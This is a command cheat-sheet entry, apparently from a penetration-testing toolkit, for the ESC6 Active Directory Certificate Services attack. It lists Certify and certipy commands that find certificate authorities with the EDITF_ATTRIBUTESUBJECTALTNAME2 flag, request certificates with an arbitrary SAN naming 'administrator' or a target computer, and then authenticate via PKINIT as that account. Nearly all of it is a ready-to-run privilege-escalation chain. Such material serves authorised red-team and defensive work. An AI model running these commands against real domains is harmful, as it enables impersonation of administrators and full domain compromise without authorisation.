---
technique: ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc6 certificate-services pkinit
---

# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

ESC6 abuses the CA EDITF_ATTRIBUTESUBJECTALTNAME2 flag, which allows arbitrary SAN values in certificate requests.

## Windows

### Certify: enumerate CA flags (ESC6)

#powershell #certify #enum

Enumerate CA configuration to find templates that allow enrollee-supplied subjects or client auth.

```powershell title:"ESC6: enumerate CAs to find auth templates"
.\Certify.exe cas
```
<!-- cheat
import domain_ip
import users
-->

### Certify: find enrollee-supplies-subject templates (ESC6)

#powershell #certify #enum #san

List templates where the enrollee can supply the subject name.

```powershell title:"ESC6: list templates with enrollee-supplied subject"
.\Certify.exe /enrolleeSuppliesSubject
```
<!-- cheat
import domain_ip
import users
-->

### Certify: find client auth templates (ESC6)

#powershell #certify #enum #clientauth

List templates with client authentication EKU present.

```powershell title:"ESC6: list templates with client authentication EKU"
.\Certify.exe /clientauth
```
<!-- cheat
import domain_ip
import users
-->

### Certify: request cert with arbitrary SAN (ESC6)

#powershell #certify #san

Request an auth template cert with an arbitrary SAN when EDITF_ATTRIBUTESUBJECTALTNAME2 is set.

```powershell title:"ESC6: request cert with administrator SAN via Certify"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"administrator"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

## Linux

### ESC6: Step 1: request cert with arbitrary SAN (certipy)

#certipy #editf-san #ca-flag

With EDITF_ATTRIBUTESUBJECTALTNAME2 set on the CA, request any auth template with an arbitrary UPN in the SAN.

```sh title:"ESC6: arbitrary SAN via EDITF_ATTRIBUTESUBJECTALTNAME2"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC6: Step 2: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the cert with the arbitrary SAN.

```sh title:"ESC6: PKINIT with arbitrary SAN cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### certipy: enumerate ESC6

#certipy #enum #editf-san

Check if any CA has the UserSpecifiedSAN (EDITF_ATTRIBUTESUBJECTALTNAME2) flag enabled.

```sh title:"ESC6: check for EDITF_ATTRIBUTESUBJECTALTNAME2 via certipy"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->

### certipy: request cert with arbitrary DNS SAN (ESC6)

#certipy #san #pkinit

Request an auth template certificate with an arbitrary DNS SAN to impersonate a computer account.

```sh title:"ESC6: request cert with arbitrary DNS SAN"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User -dns $target_fqdn
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var target_fqdn
-->
